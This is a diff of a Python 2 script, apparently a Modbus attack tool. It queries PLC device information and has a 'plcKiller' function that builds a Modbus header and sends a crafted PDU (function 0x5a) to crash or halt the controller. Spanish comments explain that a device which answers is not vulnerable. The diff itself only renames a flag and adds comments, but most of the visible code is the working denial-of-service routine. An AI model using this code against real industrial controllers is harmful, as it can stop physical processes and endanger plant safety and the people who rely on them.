@@ -2,8 +2,6 @@
 import time
 import socket
 import sys
-#import random
-import time
 import argparse
 
 banner = '''
@@ -58,7 +56,7 @@ args        	= 	parser.parse_args()
 HST   			= 	args.HOST
 SID 			= 	str(args.SlaveID) # now hex (00 to ff). switch to int (0 to 255) !!!!
 portModbus		= 	args.PORT
-checkDOS		= 	bool(args.CHECK)
+checkDev		= 	bool(args.CHECK)
 killerPLC 		= 	bool(args.KILL)
 
 
@@ -123,6 +121,7 @@ client.settimeout(3)
 
 def get_obj_DevInfo(reqMD):
 	try:
+		# me podre conectar ?
 		client.connect((HST,int(portModbus)))
 	except Exception, e:
 	 	if str(e) == "timed out":
@@ -134,9 +133,11 @@ def get_obj_DevInfo(reqMD):
 	client.send(reqMD.decode('hex'))
 
 	try:
+		# get_obj_DevInfo()
 		# Tendremos respuesta ?
 		MbResponse = client.recv(2048)
 	except Exception, e:
+		# game over
 		if str(e) == "timed out":
 		 	print Colors.GREEN+str(e)+Colors.DEFAULT
 
@@ -163,11 +164,10 @@ def get_obj_DevInfo(reqMD):
 			objTot = aframe[26:28]
 			nObjeto = int(objTot,16)
 		except:
-			objTot = '0'
+			#objTot = '0'
 			nObjeto = int('0',10)
 
-		print Colors.BLUE+' [+] TotalObj: \t\t'+Colors.RED+str(nObjeto)+Colors.DEFAULT
-		print ''
+		print Colors.BLUE+' [+] TotalObj: \t\t'+Colors.RED+str(nObjeto)+"\n"+Colors.DEFAULT
 		pInicial = 28
 
 		for i in xrange(0,nObjeto):
@@ -196,7 +196,6 @@ def get_obj_DevInfo(reqMD):
 def plcKiller(pduInjection):
 	reqst = {}
 	lenPdu = str((len(pduInjection)/2)+1)
-	#reqst[0] =	create_header_modbus('5',SID) # jugando con 
 	reqst[0] =	create_header_modbus(lenPdu,SID)
 	reqst[1] =	pduInjection
 
@@ -204,11 +203,12 @@ def plcKiller(pduInjection):
 	MB_Request +=	reqst[1] # pdu
 
 	try:
+		# podremos conectarnos ?
 		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		client.settimeout(2)
 		client.connect((HST,portModbus))
-
 	except Exception, e:
+		# game over; No conecction !
 		noConnection()		
 
 	mbKiller = MB_Request.decode('hex')
@@ -216,9 +216,11 @@ def plcKiller(pduInjection):
 	injection = Colors.GREEN+reqst[0]+Colors.RED+reqst[1]+Colors.DEFAULT
 	print " [+] Bad Injection: \t"+injection
 
-	client.send(mbKiller)
+	client.send(mbKiller) # enviamos ==> "header" + \x5a\x00\x20\x00\x00 
 	
 	try:
+		# tendremos respuesta ?
+		# Si responde, el device no es vulnerable
 		modResponse = (client.recv(1024))	
 		print " [+] Response: \t\t"+modResponse.encode("hex")
 		print " [+] Response(dec): \t"+modResponse
@@ -243,7 +245,7 @@ def main():
 	print Colors.BLUE+bannerInfo+Colors.DEFAULT
 
 
-	if checkDOS == True:
+	if checkDev == True:
 		get_obj_DevInfo(modbusRequest)	
 
 	elif killerPLC == True:
